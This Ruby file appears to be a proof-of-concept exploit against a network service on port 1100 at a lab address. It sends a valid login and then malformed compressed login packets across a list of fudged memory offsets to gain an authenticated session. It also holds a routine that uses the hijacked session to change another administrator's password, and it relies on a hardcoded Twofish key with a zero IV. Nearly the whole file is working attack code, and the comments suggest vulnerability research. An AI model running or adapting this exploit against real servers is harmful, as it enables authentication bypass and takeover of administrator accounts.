# Encoding: ASCII-8bit

require 'socket'
require 'zlib'
require 'twofish'
require 'pp'
require 'timeout'

LIMIT = 500

# Experimentally ordered from most to least likely
OFFSETS = [ 0x380, 0x150, 0x620, 0x310, 0x690, 0xe0, 0x460, 0x230, 0x70, 0x540, 0x3f0, 0xa10, 0x700, 0x1c0, 0xd20, 0x4d0, 0x2a0, 0xc40, 0xd90, 0x7e0, 0x11f0, 0xee0, 0xbd0, 0x850, 0xcb0, 0xb60, 0xaf0, 0x930, 0x5b0, 0xe70, 0xe00, 0x10a0, 0x770, 0x19d0, 0x1340, 0xa80, 0x8c0, 0x13b0, 0xf50, 0x9a0, 0x18f0, 0x1730, 0x1420, 0x1260, 0x1180, 0x1110, 0x1030, 0xfc0, 0x17a0, 0x1650, 0x15e0, 0x1500, 0x12d0, 0x1a40, 0x1810, 0x1570, 0x1490 ]

NEW_PASSWORD = "abcd1234!"

def encode_int(name, value, unk1: 5)
  return [name, unk1, 4, value].pack('a4VVV')
end

def encode_quad(name, value, unk1: 5)
  return [name, unk1, 8, value].pack('a4VVQ')
end

def encode_str(name, value, unk1: 5, length: nil)
  length = length.nil? ? -(value.length + 1) : length

  # Create the "data" portion
  str = [length, *value.bytes].pack('Vv*')

  # Prepend the rest
  return [name, unk1, str.length, str].pack('a4VVa*')
end

def encode_bytes(name, value, unk1: 5, length: nil)
  length = length.nil? ? value.length : length

  # Create the "data" portion
  str = [length, value].pack('Va*')

  # Prepend the rest
  return [name, unk1, str.length, str].pack('a4VVa*')
end

def encode_uuid(name, value, unk1: 5)
  # Prepend the rest
  return [name, unk1, value.length, value].pack('a4VVa*')
end

def encrypt_password(pw)
  # Encode as UTF-16
  pw = pw.encode("UTF-16LE")

  # Static 5-byte key for extra security
  tf = Twofish.new("tfgry\0\0\0\0\0\0\0\0\0\0\0", :padding => :zero_byte, :mode => :cbc)

  # By default, the library randomizes the IV, so set it specifically
  tf.iv = "\0" * 16

  return tf.encrypt(pw)
end

def do_compress(message)
  message = Zlib::deflate(message)
  return [message.length + 8, 0xff7f, message].pack('VVa*')
end

def receive_message(s)
  header = s.recv(4)
  if !header || header.length != 4
    raise "Couldn't receive the header!"
  end

  length = header.unpack('V').pop

  body = s.recv(length - 4)
  if !body || body.length != length - 4
    raise "Couldn't receive the body!"
  end

  return header + body
end

def do_good_login()
  # Create a standard login packet
  good_login = encode_bytes('PSWD', encrypt_password("Password1!")) +
    encode_str('ADLN', "ron") +
    encode_int('AMID', 0)

  good_login = [good_login.length + 8, 0x01, good_login].pack('VVa*') # 94 bytes long

  begin
    s = TCPSocket.new('172.16.166.170', 1100)
    receive_message(s)
    #$stderr.puts "Sending good login..."
    s.write(good_login)
    #puts "Good response: #{ receive_message(s).unpack('H*') }"
  rescue StandardError => e
    $stderr.puts "Good failed: #{ e }"
  ensure
    s.close()
  end
end

def do_evil_login(fudge)
  evil_packet = [
    fudge + 0x5e, # length of my message + next one
    0x01, # msgid
  ].pack('VV')

  evil_packet += [
    'aaaa', # name doesn't matter
    5, # type
    fudge - 0x0c, # length - (expected offset - 0x0c)
    0, # data - doesn't matter
    'a' * 80 # make it to the same size as my login packet
  ].pack('a4VVVa*')
  evil_packet = do_compress(evil_packet)

  begin
    s = TCPSocket.new('172.16.166.170', 1100)
    receive_message(s)
    #$stderr.puts "Sending evil login..."
    s.write(evil_packet)
    response = receive_message(s)

    if response.length > 32
      return s
    end
  rescue StandardError => e
    #puts "Evil failed: #{ e }"
    s.close
  ensure
  end

  s.close
  return false
end

def go(s)
  begin
    $stderr.puts "Attempting to change password..."
    change_password = '' +
      encode_bytes('PSWD', encrypt_password(NEW_PASSWORD)) +

      # In a real exploit, this UUID would have to be set correctly
      encode_uuid('ADLN', "\x3b\x3c\x30\x7b\xe2\x38\x46\xb7\x82\xe8\x30\x0f\xce\xa7\x1f\x73")

    change_password = [change_password.length + 8, 0x4d, change_password].pack('VVa*')
    s.write(change_password)

    $stderr.puts receive_message(s)

    $stderr.puts "Change password for otheradmin to #{ NEW_PASSWORD }!"
  rescue StandardError => e
    $stderr.puts "Couldn't change PW: #{ e }"
  end
  exit
end

1.upto(LIMIT) do |i|
  do_good_login()
  OFFSETS.each do |fudge|
    if do_evil_login(fudge)
      #$stderr.puts "Looks good!"
      puts "#{i},0x#{fudge.to_s(16)}"
      exit
      # go(s)
    end
  end
end

$stderr.puts "Failed after #{ LIMIT } tries!"
